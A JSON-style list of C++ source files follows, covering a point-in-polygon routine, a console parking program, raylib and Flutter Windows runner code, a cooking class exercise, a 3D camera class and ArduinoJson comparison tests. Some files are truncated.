    "#include \"clipper-cpp11.h\"\n\n// clipper only works with integers, so double values have to be multiplied by\n// this amount before converting to int:\nconst long long mult = 1e6;\n\n//' rcpp_pip\n//'\n//' polys List of polygons for which to extract membership\n//' @noRd\nwritable::integers cpp_pip(\n        const list polys,\n        const list xy)\n{\n    const doubles x = xy [\"x\"];\n    const doubles y = xy [\"y\"];\n    const int n = x.size ();\n\n    const int n_polys = static_cast <int> (polys.size ());\n    const double np_dbl = static_cast <double> (polys.size ());\n\n    writable::integers res (n);\n    std::fill (res.begin (), res.end (), -1L);\n    for (int i = 0; i < n_polys; i++)\n    {\n        doubles pi = polys [i];\n        const int nrow = pi.size () / 2;\n        \n        ClipperLib::Path path;\n        for (size_t j = 0; j < nrow; j++)\n        {\n            path << ClipperLib::IntPoint (round (pi [j] * mult),\n                    round (pi [nrow + j] * mult));\n        }\n\n        for (size_t j = 0; j < n; j++)\n        {\n            const ClipperLib::IntPoint pj =\n                ClipperLib::IntPoint (round (x [j] * mult),\n                                      round (y [j] * mult));\n            int pip = ClipperLib::PointInPolygon (pj, path);\n            if (pip != 0) res [j] = i;\n        }\n\n        const double i_dbl = static_cast <double> (i);\n        const double progress = 100.0 * i_dbl / np_dbl;\n        Rprintf (\"\\r%i / %i: %2.2f%%\", i, n_polys, progress);\n        check_user_interrupt ();\n    }\n    Rprintf (\"\\r%i / %i: 100.00%%\\n\", n_polys, n_polys);\n\n    return res;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int u_input;\r\n    int amount = 0, count = 0;\r\n    int c = 0, r = 0, b = 0;\r\n    const int MAX_PARKING = 50;\r\n\r\n    while(true)\r\n    {\r\n        cout<<\"\\n\\t\\tWelcom to simple parking system\"<<endl;\r\n\t\tcout << \"\\t\\tPress 1 for Rickshaw (100 Rs)\" << endl;\r\n        cout << \"\\t\\tPress 2 for Car (200 Rs)\" << endl;\r\n        cout << \"\\t\\tPress 3 for Bus (300 Rs)\" << endl;\r\n        cout << \"\\t\\tPress 4 to show the record\" << endl;\r\n        cout << \"\\t\\tPress 5 to delete the record\" << endl;\r\n        cout << \"\\t\\tPress 6 to exit\" << endl;\r\n        cout << \"\\t\\tEnter your choice: \";\r\n        \r\n        cin >> u_input;\r\n\r\n        if(cin.fail()) {\r\n            cin.clear(); // clear the error flags\r\n            cin.ignore(INT_MAX, '\\n'); // discard invalid input\r\n            cout << \"Invalid input. Please enter a number between 1 and 6.\" << endl;\r\n            continue;\r\n        }\r\n\r\n        switch(u_input)\r\n        {\r\n            case 1:\r\n                if(count < MAX_PARKING)\r\n                {\r\n                    r++;\r\n                    amount += 100;\r\n                    count++;\r\n                    cout << \"Rickshaw parked. 100 Rs charged.\" << endl;\r\n                }\r\n                else\r\n                    cout << \"No more parking space available.\" << endl;\r\n                break;\r\n\r\n            case 2:\r\n                if(count < MAX_PARKING)\r\n                {\r\n                    c++;\r\n                    amount += 200;\r\n                    count++;\r\n                    cout << \"Car parked. 200 Rs charged.\" << endl;\r\n                }\r\n                else\r\n                    cout << \"No more parking space available.\" << endl;\r\n                break;\r\n\r\n            case 3:\r\n                if(count < MAX_PARKING)\r\n                {\r\n                    b++;\r\n                    amount += 300;\r\n                    count++;\r\n                    cout << \"Bus parked. 300 Rs charged.\" << endl;\r\n                }\r\n                else\r\n                    cout << \"No more parking space available.\" << endl;\r\n                break;\r\n\r\n            case 4:\r\n                cout << \"********************************************************\" << endl;\r\n                cout << \"Total amount collected = \" << amount << \" Rs\" << endl;\r\n                cout << \"Total number of vehicles parked = \" << count << endl;\r\n                cout << \"Rickshaws parked = \" << r << endl;\r\n                cout << \"Cars parked = \" << c << endl;\r\n                cout << \"Buses parked = \" << b << endl;\r\n                cout << \"Available parking slots = \" << MAX_PARKING - count << endl;\r\n                cout << \"********************************************************\" << endl;\r\n                break;\r\n\r\n            case 5:\r\n                amount = 0;\r\n                count = 0;\r\n                r = 0;\r\n                c = 0;\r\n                b = 0;\r\n                cout << \"**************************************************\" << endl;\r\n                cout << \"RECORD DELETED\" << endl;\r\n                cout << \"***************************************************\" << endl;\r\n                break;\r\n\r\n            case 6:\r\n                cout << \"Exiting the program. Thank you!\" << endl;\r\n                return 0;\r\n\r\n            default:\r\n                cout << \"Invalid number entered. Please enter a number between 1 and 6.\" << endl;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <raylib.h>\n\n#include \"bouncing_pellet.hpp\"\n\nvoid Draw2DGrid(int topLeftX, int topLeftY, int width, int height,\n    int numCellsX, int numCellsY){\n    float cellWidth = (float)width / numCellsX;\n    float cellHeight = (float)height / numCellsY;\n    \n    for(int x = 1; x < numCellsX; x++)\n    {\n        DrawLine(topLeftX + x * cellWidth, topLeftY, topLeftX + x * cellWidth,\n            topLeftY + height, WHITE);\n    }\n    \n    for(int y = 1; y < numCellsY; y++)\n    {\n        DrawLine(topLeftX, topLeftY + y * cellHeight, topLeftX + width,\n            topLeftY + y * cellHeight, WHITE);\n    }\n    //DrawLine(int startPosX, int startPosY, int endPosX, int endPosY, Color color); \n}\n\nint main()\n{\n    int windowWidth {1920};\n    int windowHeight {1080};\n    float windowWidth_f {(float)windowWidth};\n    float windowHeight_f {(float)windowHeight};\n    \n    float borderWidth {windowWidth_f / 3};\n    float borderHeight {windowHeight_f - 100};\n    float borderXPos {(windowWidth_f - borderWidth) / 2};\n    float borderYPos {(windowHeight_f - borderHeight) / 2};\n    \n    const GridCellIndex grid_dimensions(5, 10);\n    const int fps = 60;\n    InitWindow(windowWidth, windowHeight, \"Game\");\n    SetTargetFPS(fps);\n\n    BouncingPellet bp(3.0, 9.0, 70.8);\n    \n    while(WindowShouldClose() == false)\n    {\n        BeginDrawing();\n        //Updating\n        bp.Move(grid_dimensions, fps);\n\n        //Drawing\n        Rectangle border = Rectangle{borderXPos, borderYPos, borderWidth,\n            borderHeight};\n\n        ClearBackground(BLACK);\n        Draw2DGrid(borderXPos, borderYPos, borderWidth, borderHeight,\n            grid_dimensions.x, grid_dimensions.y);\n        DrawRectangleLinesEx(border, 3, GREEN);\n\n        bp.Draw(DrawPosition(borderXPos, borderYPos), (float)borderWidth / grid_dimensions.x, (float)borderHeight / grid_dimensions.y);\n\n        EndDrawing();\n    }\n\n    CloseWindow();\n    return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"live_demo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\r\n#include <ctime>\r\n#include<vector>\r\nusing namespace std;\r\n\r\n__interface Product {\r\n\tstring GetName();\r\n};\r\n\r\nclass Fridge {\r\n\tvector<string> products;\r\npublic:\r\n\tvirtual ~Fridge(){}\r\n\tvoid AddProduct(Product* product) {\r\n\t\tproducts.push_back(product->GetName());\r\n\t}\r\n\r\n\tvoid RemoveProduct(Product* product) {\r\n\t\tfor (int i = 0; i < products.size(); i++)\r\n\t\t{\r\n\t\t\tif (product->GetName() == products[i])\r\n\t\t\t\tproducts.erase(products.begin() + i);\r\n\t\t}\r\n\t}\r\n\r\n\tint GetCountSomeProduct(string name_product) {\r\n\t\tint count = 0;\r\n\t\tfor (int i = 0; i < products.size(); i++) {\r\n\t\t\tif (name_product == products[i])\r\n\t\t\t\tcount++;\r\n\t\t}\r\n\t\treturn count;\r\n\t}\r\n};\r\n\r\n__interface Dish{\r\n\tvoid Print();\r\n};\r\n\r\n__interface RawProduct : public Product{ \t\r\n};\r\n\r\n__interface Vegetable : public Product{ \t\r\n};\r\n\r\nclass Tomato : public Vegetable {\r\n\tstring name = \"tomato\";\r\npublic:\r\n\tvirtual ~Tomato(){}\r\n\tstring GetName() {\r\n\t\treturn name;\r\n\t}\r\n};\r\n\r\nclass Cucumber : public Vegetable {\r\n\tstring name = \"cucumber\";\r\npublic:\r\n\tvirtual ~Cucumber() {}\r\n\tstring GetName() {\r\n\t\treturn name;\r\n\t}\r\n};\r\n\r\nclass Varenyk : public RawProduct {\r\n\tstring name = \"varenyk\";\r\npublic:\r\n\tvirtual ~Varenyk(){}\r\n\tstring GetName() {\r\n\t\treturn name;\r\n\t}\r\n};\r\n\r\nclass BoiledVarenyk : public Dish {\r\npublic:\t\r\n\tvirtual ~BoiledVarenyk() {}\r\n\tvoid Cook(Fridge* fridge, RawProduct* product1){\r\n\t\tif (fridge->GetCountSomeProduct(product1->GetName()) <= 0)\r\n\t\t\tthrow\"error\";\r\n\t}\r\n\tvoid Print() {\r\n\t\tcout << \"boiled varenyk\\n\";\r\n\t}\r\n};\r\n\r\nclass Egg : public RawProduct {\r\n\tstring name = \"egg\";\r\npublic:\r\n\tvirtual ~Egg() {}\r\n\tstring GetName() {\r\n\t\treturn name;\r\n\t}\r\n};\r\n\r\nclass BoiledEgg : public Dish {\r\npublic:\r\n\tvirtual ~BoiledEgg() {}\r\n\r\n\tvoid Cook(Fridge* fridge, RawProduct* product1) {\r\n\t\tif (fridge->GetCountSomeProduct(product1->GetName()) > 0)\r\n\t\t\tcout << \"boiled eggs count \" << fridge->GetCountSomeProduct(product1->GetName()) << \"\\n\";\r\n\t}\r\n\r\n\tvoid Print() {\r\n\t\tcout << \"boiled egg\\n\";\r\n\t}\r\n};\r\n\r\nclass FryedEgg : public Dish{\r\npublic:\r\n\tvirtual ~FryedEgg() {}\r\n\r\n\tvoid Cook(Fridge* fridge, RawProduct* product1){\r\n\t\tif (fridge->GetCountSomeProduct(product1->GetName()) > 0)\r\n\t\t\tcout << \"fryed eggs count \" << fridge->GetCountSomeProduct(product1->GetName()) << \"\\n\";\r\n\t}\r\n\r\n\tvoid Print() {\r\n\t\tcout << \"fryed egg\\n\";\r\n\t}\r\n};\r\n\r\n\r\nclass Salad : public Dish{\t\r\npublic:\r\n\tvirtual ~Salad() {\r\n\t}\r\n\tvoid Cook(Fridge* fridge, Vegetable* product1, Vegetable* product2) {\r\n\t\tif(fridge->GetCountSomeProduct(product1->GetName()) > 2 && fridge->GetCountSomeProduct(product2->GetName()) > 2)\r\n\t\t\tcout << \"salad ingredients\\n\" << product1->GetName() << \"\\n\" << product2->GetName();\r\n\t}\r\n\r\n\tvoid Print() {\r\n\t\tcout << \"salad\\n\";\r\n\t}\r\n};\r\n\r\n__interface Timetable {\r\n\tDish* Cook(Fridge* fridge);\r\n};\r\n\r\nclass MorningDish : public Timetable {\r\npublic:\r\n\tvirtual ~MorningDish(){}\r\n\tDish* Cook(Fridge* fridge) {\r\n\t\t// Boiled Eggs\r\n\t\tif (fridge->GetCountSomeProduct(\"egg\") > 0)\r\n\t\t\treturn new FryedEgg;\r\n\t\telse\r\n\t\t\tthrow\"error\";\r\n\t}\r\n};\r\n\r\nclass LunchDish : public Timetable {\r\npublic:\r\n\tvirtual ~LunchDish(){}\r\n\tDish* Cook(Fridge* fridge) {\r\n\t//Varenyky}\r\n\t\tif (fridge->GetCountSomeProduct(\"varenyk\") > 0)\r\n\t\t\treturn new BoiledVarenyk;\r\n\t\telse\r\n\t\t\tthrow\"error\";\r\n\t}\r\n};\r\n\r\nclass EveningDish : public Timetable {\r\npublic:\r\n\tvirtual ~EveningDish(){}\r\n\tDish* Cook(Fridge* fridge) {\r\n\t//Salad\r\n\t\tif (fridge->GetCountSomeProduct(\"tomato\") > 0 || fridge->GetCountSomeProduct(\"cucumber\") > 0)\r\n\t\t\treturn new Salad;\r\n\t\telse\r\n\t\t\tthrow\"error\";\r\n\t}\r\n};\r\n\r\nclass Chef {\r\nprotected:\r\n\tFridge* fridge = nullptr;\r\n\tTimetable* timetable = nullptr;\r\npublic:\r\n\tChef() {\r\n\t\tfridge = new Fridge;\r\n\t}\r\n\r\n\tDish* Cook(Fridge* fridge, Timetable* product) {\r\n\t\treturn product->Cook(fridge);\r\n\t}\r\n\r\n\tDish* Boil(RawProduct* product) {\r\n\t\tif (product->GetName().compare(\"varenyk\"))\r\n\t\t\treturn new BoiledVarenyk;\r\n\t\telse if (product->GetName().compare(\"egg\"))\r\n\t\t\treturn new BoiledEgg;\r\n\t}\r\n\r\n\t//void SetProduct(Product* product){}\r\n\tFridge* ViewFridge(){\r\n\t\treturn fridge;\r\n\t}\r\n\r\n\tvoid SetTimetable(Timetable* timetable) {\r\n\t\tif (this->timetable == nullptr) \r\n\t\t\tdelete this->timetable;\r\n\t\tthis->timetable = timetable;\r\n\t}\r\n};\r\n\r\n\r\nint main(){\r\n\tChef chef;\r\n\tFridge fridge;\r\n\tEgg a;\r\n\tEgg b;\r\n\tTomato t;\r\n\tCucumber f;\r\n\tVarenyk v;\r\n\tfridge.AddProduct(&a);\r\n\tfridge.AddProduct(&b);\r\n\tfridge.AddProduct(&f);\r\n\tfridge.AddProduct(&v);\r\n\tfridge.AddProduct(&t);\r\n\tauto product = chef.Cook(&fridge, new MorningDish);\r\n\tproduct->Print();\r\n}\r\n",
    "#include \"camera.hpp\"\n\n// std\n#include <cassert>\n#include <limits>\n\nnamespace Engine {\nvoid Camera::setOrthographicProjection(\n    float left, float right, float top, float bottom, float near, float far) {\n    projectionMatrix = glm::mat4{1.0f};\n    projectionMatrix[0][0] = 2.f / (right - left);\n    projectionMatrix[1][1] = 2.f / (bottom - top);\n    projectionMatrix[2][2] = 1.f / (far - near);\n    projectionMatrix[3][0] = -(right + left) / (right - left);\n    projectionMatrix[3][1] = -(bottom + top) / (bottom - top);\n    projectionMatrix[3][2] = -near / (far - near);\n}\n\nvoid Camera::setPerspectiveProjection(float fovy, float aspect, float near, float far) {\n    assert(glm::abs(aspect - std::numeric_limits<float>::epsilon()) > 0.0f);\n    const float tanHalfFovy = tan(fovy / 2.f);\n    projectionMatrix = glm::mat4{0.0f};\n    projectionMatrix[0][0] = 1.f / (aspect * tanHalfFovy);\n    projectionMatrix[1][1] = 1.f / (tanHalfFovy);\n    projectionMatrix[2][2] = far / (far - near);\n    projectionMatrix[2][3] = 1.f;\n    projectionMatrix[3][2] = -(far * near) / (far - near);\n}\n\nvoid Camera::setViewDirection(glm::vec3 position, glm::vec3 direction, glm::vec3 up) {\n    const glm::vec3 w{glm::normalize(direction)};\n    const glm::vec3 u{glm::normalize(glm::cross(w, up))};\n    const glm::vec3 v{glm::cross(w, u)};\n\n    viewMatrix = glm::mat4{1.f};\n    viewMatrix[0][0] = u.x;\n    viewMatrix[1][0] = u.y;\n    viewMatrix[2][0] = u.z;\n    viewMatrix[0][1] = v.x;\n    viewMatrix[1][1] = v.y;\n    viewMatrix[2][1] = v.z;\n    viewMatrix[0][2] = w.x;\n    viewMatrix[1][2] = w.y;\n    viewMatrix[2][2] = w.z;\n    viewMatrix[3][0] = -glm::dot(u, position);\n    viewMatrix[3][1] = -glm::dot(v, position);\n    viewMatrix[3][2] = -glm::dot(w, position);\n}\n\nvoid Camera::setViewTarget(glm::vec3 position, glm::vec3 target, glm::vec3 up) {\n    setViewDirection(position, target - position, up);\n}\n\nvoid Camera::setViewYXZ(glm::vec3 position, glm::vec3 rotation) {\n    const float c3 = glm::cos(rotation.z);\n    const float s3 = glm::sin(rotation.z);\n    const float c2 = glm::cos(rotation.x);\n    const float s2 = glm::sin(rotation.x);\n    const float c1 = glm::cos(rotation.y);\n    const float s1 = glm::sin(rotation.y);\n    const glm::vec3 u{(c1 * c3 + s1 * s2 * s3), (c2 * s3), (c1 * s2 * s3 - c3 * s1)};\n    const glm::vec3 v{(c3 * s1 * s2 - c1 * s3), (c2 * c3), (c1 * c3 * s2 + s1 * s3)};\n    const glm::vec3 w{(c2 * s1), (-s2), (c1 * c2)};\n    viewMatrix = glm::mat4{1.f};\n    viewMatrix[0][0] = u.x;\n    viewMatrix[1][0] = u.y;\n    viewMatrix[2][0] = u.z;\n    viewMatrix[0][1] = v.x;\n    viewMatrix[1][1] = v.y;\n    viewMatrix[2][1] = v.z;\n    viewMatrix[0][2] = w.x;\n    viewMatrix[1][2] = w.y;\n    viewMatrix[2][2] = w.z;\n    viewMatrix[3][0] = -glm::dot(u, position);\n    viewMatrix[3][1] = -glm::dot(v, position);\n    viewMatrix[3][2] = -glm::dot(w, position);\n}\n}  // namespace Engine",
    "// ArduinoJson - https://arduinojson.org\n// Copyright \u00a9 2014-2024, Benoit BLANCHON\n// MIT License\n\n#include <ArduinoJson.h>\n#include <catch.hpp>\n\n// Most code is already covered by arithmeticCompare.cpp.\n// Here, we're just filling the holes\n\nTEST_CASE(\"Compare JsonVariant with value\") {\n  JsonDocument doc;\n  JsonVariant a = doc.add<JsonVariant>();\n\n  SECTION(\"null vs (char*)0\") {\n    char* b = 0;\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"42 vs 42\") {\n    a.set(42);\n    int b = 42;\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n}\n\nTEST_CASE(\"Compare JsonVariant with JsonVariant\") {\n  JsonDocument doc;\n  JsonVariant a = doc.add<JsonVariant>();\n  JsonVariant b = doc.add<JsonVariant>();\n\n  SECTION(\"'abc' vs 'abc'\") {\n    a.set(\"abc\");\n    b.set(\"abc\");\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"'abc' vs 'bcd'\") {\n    a.set(\"abc\");\n    b.set(\"bcd\");\n\n    CHECK(a != b);\n    CHECK(a < b);\n    CHECK(a <= b);\n    CHECK_FALSE(a == b);\n    CHECK_FALSE(a > b);\n    CHECK_FALSE(a >= b);\n  }\n\n  SECTION(\"'bcd' vs 'abc'\") {\n    a.set(\"bcd\");\n    b.set(\"abc\");\n\n    CHECK(a != b);\n    CHECK(a > b);\n    CHECK(a >= b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a <= b);\n    CHECK_FALSE(a == b);\n  }\n\n  SECTION(\"serialized('abc') vs serialized('abc')\") {\n    a.set(serialized(\"abc\"));\n    b.set(serialized(\"abc\"));\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"serialized('abc') vs serialized('bcd')\") {\n    a.set(serialized(\"abc\"));\n    b.set(serialized(\"bcd\"));\n\n    CHECK(a != b);\n    CHECK(a < b);\n    CHECK(a <= b);\n    CHECK_FALSE(a == b);\n    CHECK_FALSE(a > b);\n    CHECK_FALSE(a >= b);\n  }\n\n  SECTION(\"serialized('bcd') vs serialized('abc')\") {\n    a.set(serialized(\"bcd\"));\n    b.set(serialized(\"abc\"));\n\n    CHECK(a != b);\n    CHECK(a > b);\n    CHECK(a >= b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a <= b);\n    CHECK_FALSE(a == b);\n  }\n\n  SECTION(\"false vs true\") {\n    a.set(false);\n    b.set(true);\n\n    CHECK(a != b);\n    CHECK(a < b);\n    CHECK(a <= b);\n    CHECK_FALSE(a == b);\n    CHECK_FALSE(a > b);\n    CHECK_FALSE(a >= b);\n  }\n\n  SECTION(\"false vs -1\") {\n    a.set(false);\n    b.set(-1);\n\n    CHECK(a != b);\n    CHECK(a > b);\n    CHECK(a >= b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a <= b);\n    CHECK_FALSE(a == b);\n  }\n\n  SECTION(\"null vs null\") {\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"42 vs 42\") {\n    a.set(42);\n    b.set(42);\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"42 vs 42U\") {\n    a.set(42);\n    b.set(42U);\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"42 vs 42.0\") {\n    a.set(42);\n    b.set(42.0);\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"42.0 vs 42\") {\n    a.set(42.0);\n    b.set(42);\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"-42 vs -42\") {\n    a.set(-42);\n    b.set(-42);\n\n    CHECK(a == b);\n    CHECK(a <= b);\n    CHECK(a >= b);\n    CHECK_FALSE(a != b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a > b);\n  }\n\n  SECTION(\"-42 vs 42\") {\n    a.set(-42);\n    b.set(42);\n\n    CHECK(a != b);\n    CHECK(a < b);\n    CHECK(a <= b);\n    CHECK_FALSE(a == b);\n    CHECK_FALSE(a > b);\n    CHECK_FALSE(a >= b);\n  }\n\n  SECTION(\"42 vs -42\") {\n    a.set(42);\n    b.set(-42);\n\n    CHECK(a != b);\n    CHECK(a > b);\n    CHECK(a >= b);\n    CHECK_FALSE(a < b);\n    CHECK_FALSE(a <= b);\n    CHECK_FALSE(a == b);\n  }\n\n  SECTION(\"42.0 vs -42\") {\n    a.set(42.0);\n    b.set(-42);\n\n    CHECK(a != b);\n    CHECK(a > b);\n    CHECK(a >= b);\n    CHECK_FALSE(a < b);\n    